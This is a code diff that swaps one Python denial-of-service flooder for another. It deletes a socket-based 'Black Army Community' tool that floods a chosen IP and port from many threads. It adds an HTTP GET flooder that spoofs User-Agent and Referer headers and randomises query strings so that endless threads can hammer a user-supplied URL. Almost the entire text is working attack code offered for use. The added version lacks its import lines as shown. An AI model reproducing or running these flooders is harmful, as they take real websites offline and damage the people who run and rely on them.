@@ -1,141 +1,69 @@
-# CHECK IMPORT
-try:
-    import socket
-    import threading
-    import string
-    import random
-    import time
-    import os
-    import platform
-    import sys
-    from colorama import Fore
-except ModuleNotFoundError as e:
-    print(f"{e} CAN'T IMPORT . . . .")
-    exit()
 
-# DEF & CLASS
+url = input("\033[96mURL:  \033[0m").strip()
+u = int(0)
+headers = []
+referer = [
+    "https://github.com/",
+    "https://google.it/",
+    "https://facebook.com/",
+    "https://alibaba.com/",
+    "https://google.com/",
+    "https://youtube.com",
+    ]
 
-def clear_text():
-    if platform.system().upper() == "WINDOWS":
-        os.system('cls')
-    else:
-        os.system('clear')
+def useragent():
+    global headers
+    headers.append("Mozilla/5.0 (Windows Phone 10.0; Android 6.0.1; Microsoft; RM-1152)")
+    headers.append("Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko)")
+    headers.append("Mozilla/5.0 (Linux; Android 6.0.1; SM-G920V Build/MMB29K) AppleWebKit/537.36")
+    headers.append("Mozilla/5.0 (Windows; U; Windows NT 5.0; es-ES; rv:1.8.0.3) Gecko/20060426 Firefox/1.5.0.3")
+    headers.append("Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:97.0) Gecko/20100101 Firefox/97.0")
+    headers.append("Mozilla/5.0 (iPhone; CPU iPhone OS 14_7_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) FxiOS/36.0  Mobile/15E148 Safari/605.1.15")
 
-def status_print(ip,port,thread_id,rps,path_get):
-    time.sleep(2)
-    print(f"{Fore.MAGENTA}[] {Fore.LIGHTYELLOW_EX}SRIKANDI-313 {Fore.CYAN}:: {Fore.LIGHTBLUE_EX}REQUEST ATTACK {Fore.WHITE}=⟩ {Fore.LIGHTMAGENTA_EX}HTTP{Fore.BLUE}TARGET {Fore.YELLOW}= {Fore.LIGHTMAGENTA_EX}{ip}:{port} {Fore.RESET}")
-def generate_url_path_pyflooder(num):
-    msg = str(string.ascii_letters + string.digits + string.punctuation)
-    data = "".join(random.sample(msg, int(num)))
-    return data
+    return headers
+
+
+def genstr(size):
+    out_str = ''
+
+    for _ in range(0, size):
+        code = random.randint(65, 90)
+        out_str += chr(code)
     
-def generate_url_path_choice(num):
-    letter = '''abcdefghijklmnopqrstuvwxyzABCDELFGHIJKLMNOPQRSTUVWXYZ0123456789!"#$%&'()*+,-./:;?@[\]^_`{|}~'''
-    data = ""
-    for _ in range(int(num)):
-        data += random.choice(letter)
-    return data
+    return out_str
 
-# DOS
-def DoS_Attack(ip,host,port,type_attack,id,booter_sent):
-    rps = 0
-    url_path = ''
-    path_get = ['SYN_FLOOD','CHOIS_FLOOD']
-    path_get_loader = random.choice((path_get))
-    if path_get_loader == "SYN_FLOOD":
-        url_path = generate_url_path_pyflooder(5)
-    else:
-        url_path = generate_url_path_choice(5)
-    s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
+
+class httpth1(threading.Thread):
+    def run(self):
+        global u
+        while True:
+            try:
+                headers={'User-Agent' : random.choice(useragent()), 'Referer' : random.choice(referer)}
+                randomized_url = url + "?" + genstr(random.randint(3, 10))
+                requests.get(randomized_url, headers=headers)
+                u += 1
+                print("[*]  \033[31mBOT --> \033[31m " +str(u)+ "   \033[37mSend the packet  \033[34m " +url+ "\033[0m" )  
+                print("[*]  \033[31mBOT --> \033[31m " +str(u)+ "   \033[37mSend the packet  \033[34m " +url+ "\033[0m" )      
+            except requests.exceptions.ConnectionError:
+                print("[*]  \033[1mBOT --> \033[1m " +str(u)+ "   \033[97mSend the packet  \033[35m " +url+ "\033[0m" )
+                pass
+            except requests.exceptions.InvalidSchema:
+                print ("[REQUEST TIME OUT]")
+                raise SystemExit()
+            except ValueError:
+                print ("[Check Your URL]")
+                raise SystemExit()
+            except KeyboardInterrupt:
+                print("[Canceled by User]")
+                raise SystemExit()
+
+
+while True:
     try:
-        packet_data = f"{type_attack} /{url_path} HTTP/1.1\nHost: {host}\n\n".encode()
-        s.connect((ip,port))
-        for _ in range(booter_sent):
-            s.sendall(packet_data)
-            s.send(packet_data)
-            rps += 2
-    except:
-        try:
-            s.shutdown(socket.SHUT_RDWR)
-            s.close()
-        except:
-            pass
-    status_print(ip,port,id,rps,path_get_loader)
-
-status_code = False
-id_loader = 0
-def runing_attack(ip,host,port_loader,time_loader,spam_loader,methods_loader,booter_sent):
-    global status_code,id_loader
-    if status_code == True:
-        while time.time() < time_loader:
-            for _ in range(spam_loader):
-                id_loader += 1
-                th = threading.Thread(target=DoS_Attack,args=(ip,host,port_loader,methods_loader,id_loader,booter_sent))
-                th.start()
-                th = threading.Thread(target=DoS_Attack,args=(ip,host,port_loader,methods_loader,id_loader,booter_sent))
-                th.start()
-                th = threading.Thread(target=DoS_Attack,args=(ip,host,port_loader,methods_loader,id_loader,booter_sent))
-                th.start()
-                th = threading.Thread(target=DoS_Attack,args=(ip,host,port_loader,methods_loader,id_loader,booter_sent))
-                th.start()
-                th = threading.Thread(target=DoS_Attack,args=(ip,host,port_loader,methods_loader,id_loader,booter_sent))
-                th.start()
-    else:
-        threading.Thread(target=runing_attack,args=(ip,host,port_loader,time_loader,spam_loader,methods_loader,booter_sent)).start()
-
-
-
-
-
-#DATA
-banner = f""" 
-{Fore.BLACK}
-{Fore.BLACK}═════════════════════════════════════════════════════
-{Fore.BLACK}
-{Fore.BLACK}
-{Fore.GREEN}  ████{Fore.YELLOW}═╗ {Fore.GREEN}█████{Fore.YELLOW}═╗  {Fore.GREEN}█{Fore.YELLOW}═╗ {Fore.GREEN}█{Fore.YELLOW}═╗ {Fore.GREEN}█{Fore.YELLOW}═╗  {Fore.GREEN}███{Fore.YELLOW}═╗ {Fore.GREEN} ██{Fore.YELLOW}═╗ {Fore.GREEN}  █{Fore.YELLOW}═╗ {Fore.GREEN}█████{Fore.YELLOW}═╗  {Fore.GREEN}█{Fore.YELLOW}═╗
-{Fore.GREEN}  █{Fore.YELLOW} ╔══╝ {Fore.GREEN}█{Fore.YELLOW} ╔═ {Fore.GREEN}█{Fore.YELLOW} ║ {Fore.GREEN}█{Fore.YELLOW} ║ {Fore.GREEN}█{Fore.YELLOW} ║{Fore.GREEN}█{Fore.YELLOW} ║ {Fore.GREEN}█{Fore.YELLOW} ╔═ {Fore.GREEN}█{Fore.YELLOW} ║ {Fore.GREEN}█ █{Fore.YELLOW} ║  {Fore.GREEN}█{Fore.YELLOW} ║ {Fore.GREEN}█{Fore.YELLOW} ║  {Fore.GREEN}█{Fore.YELLOW} ║ {Fore.GREEN}█{Fore.YELLOW} ║
-{Fore.GREEN}  █{Fore.YELLOW} ║ {Fore.GREEN}   █{Fore.YELLOW} ║ {Fore.GREEN} █{Fore.YELLOW} ║ {Fore.GREEN}█{Fore.YELLOW} ║ {Fore.GREEN}█ █{Fore.YELLOW} ║ {Fore.GREEN} █{Fore.YELLOW} ║ {Fore.GREEN} █{Fore.YELLOW} ║ {Fore.GREEN}█{Fore.YELLOW} ║ {Fore.GREEN}█{Fore.YELLOW} ║{Fore.GREEN}█{Fore.YELLOW} ║ {Fore.GREEN}█{Fore.YELLOW} ║  {Fore.GREEN}█{Fore.YELLOW} ║ {Fore.GREEN}█{Fore.YELLOW} ║
-{Fore.GREEN}  ████{Fore.YELLOW}═╗ {Fore.GREEN}█████{Fore.YELLOW} ║  {Fore.GREEN}█{Fore.YELLOW} ║ {Fore.GREEN}██{Fore.YELLOW}╔╝   {Fore.GREEN}██████{Fore.YELLOW} ║ {Fore.GREEN}█{Fore.YELLOW} ║ {Fore.GREEN}█{Fore.YELLOW} ║{Fore.GREEN}█{Fore.YELLOW} ║ {Fore.GREEN}█{Fore.YELLOW} ║  {Fore.GREEN}█{Fore.YELLOW} ║ {Fore.GREEN}█{Fore.YELLOW} ║
-{Fore.GREEN}     █{Fore.YELLOW} ║ {Fore.GREEN}█{Fore.YELLOW} ║ {Fore.GREEN}█{Fore.YELLOW} ╚╗ {Fore.GREEN}█{Fore.YELLOW} ║ {Fore.GREEN}█ █{Fore.YELLOW} ╚╗ {Fore.GREEN}█{Fore.YELLOW} ╔═ {Fore.GREEN}█{Fore.YELLOW} ║ {Fore.GREEN}█{Fore.YELLOW} ║ {Fore.GREEN} █{Fore.YELLOW}║{Fore.GREEN}█{Fore.YELLOW} ║ {Fore.GREEN}█{Fore.YELLOW} ║  {Fore.GREEN}█{Fore.YELLOW} ║ {Fore.GREEN}█{Fore.YELLOW} ║
-{Fore.GREEN}  ████{Fore.YELLOW} ║ {Fore.GREEN}█{Fore.YELLOW} ║ {Fore.GREEN} █{Fore.YELLOW} ║ {Fore.GREEN}█{Fore.YELLOW} ║ {Fore.GREEN}█{Fore.YELLOW} ║ {Fore.GREEN}█{Fore.YELLOW} ║{Fore.GREEN}█{Fore.YELLOW} ║ {Fore.GREEN} █{Fore.YELLOW} ║ {Fore.GREEN}█{Fore.YELLOW} ║  {Fore.GREEN} ██{Fore.YELLOW} ║ {Fore.GREEN}█████{Fore.YELLOW} ║  {Fore.GREEN}█{Fore.YELLOW} ║  
-{Fore.YELLOW}   ╚═══╝ ╚═╝  ╚═  ╚═  ╚═  ╚═ ╚═   ╚═  ╚═    ╚══   ╚═════  ╚══
-{Fore.BLACK}
-{Fore.WHITE}               B L A C K  A R M Y  C O M M U N I T Y  
-{Fore.GREEN}                          INTERNAL SCRIPT                
-{Fore.BLUE}                           ATTACK ZEON                  
-{Fore.WHITE}                            —oO0Oo—                       
-{Fore.BLACK}                                                       
-{Fore.BLACK}═══════════════════════════════════════════════════
-:::—⟩ Waiting for loading ...!! <==={Fore.RESET}"""
-
-print(banner)
-host = ""
-ip = ""
-target_loader = input(f"{Fore.CYAN}::IP/URL==⟩⟩{Fore.LIGHTYELLOW_EX}")
-port_loader = int(input(f"{Fore.CYAN}::PORT==⟩⟩{Fore.LIGHTYELLOW_EX }"))
-time_loader = time.time() + int(input(f"{Fore.CYAN}::TIME ==⟩⟩{Fore.LIGHTYELLOW_EX}"))
-spam_loader = int(input(f"{Fore.CYAN}::SPAM THREAD ==⟩⟩{Fore.LIGHTYELLOW_EX}"))
-create_thread = int(input(F"{Fore.CYAN}::CREATE THREAD ==⟩⟩{Fore.LIGHTYELLOW_EX}"))
-booter_sent = int(input(F"{Fore.CYAN}::BOOTER SENT ==⟩⟩{Fore.LIGHTYELLOW_EX}"))
-print(f"{Fore.LIGHTBLUE_EX}EXAMPLE HTTP METHODS> CONNECT GET POST HEAD")
-print(f"{Fore.LIGHTBLUE_EX}EXAMPLE CUSTOM HTTP METHODS> CLOUDFLARE AGE PYFLOODER GATEWAY")
-methods_loader = input(F"{Fore.CYAN}::HTTP_METHODS ==⟩{Fore.LIGHTYELLOW_EX}")
-print(f"{Fore.LIGHTBLUE_EX}TRYING TO GET IP:PORT {Fore.LIGHTMAGENTA_EX}. . .{Fore.RESET}")
-try:
-    host = str(target_loader).replace("https://", "").replace("http://", "").replace("www.", "").replace("/", "")
-    ip = socket.gethostbyname(host)
-except socket.gaierror:
-    exit()
-for loader_num in range(create_thread):
-    sys.stdout.write(f"\r {Fore.YELLOW}{loader_num} CREATE THREAD . . .{Fore.RESET}")
-    sys.stdout.flush()
-    threading.Thread(target=runing_attack,args=(ip,host,port_loader,time_loader,spam_loader,methods_loader,booter_sent)).start()
-    threading.Thread(target=runing_attack,args=(ip,host,port_loader,time_loader,spam_loader,methods_loader,booter_sent)).start()
-    threading.Thread(target=runing_attack,args=(ip,host,port_loader,time_loader,spam_loader,methods_loader,booter_sent)).start()
-    threading.Thread(target=runing_attack,args=(ip,host,port_loader,time_loader,spam_loader,methods_loader,booter_sent)).start()
-    threading.Thread(target=runing_attack,args=(ip,host,port_loader,time_loader,spam_loader,methods_loader,booter_sent)).start()
-clear_text()
-print(banner)
-status_code = True
-print(f"{Fore.GREEN}STAR ATTACK...!! {Fore.RESET}")
+        th1 = httpth1()
+        th1.start()
+    except Exception:
+        pass
+    except KeyboardInterrupt:
+        exit("[Canceled By User]")
+        raise SystemExit()
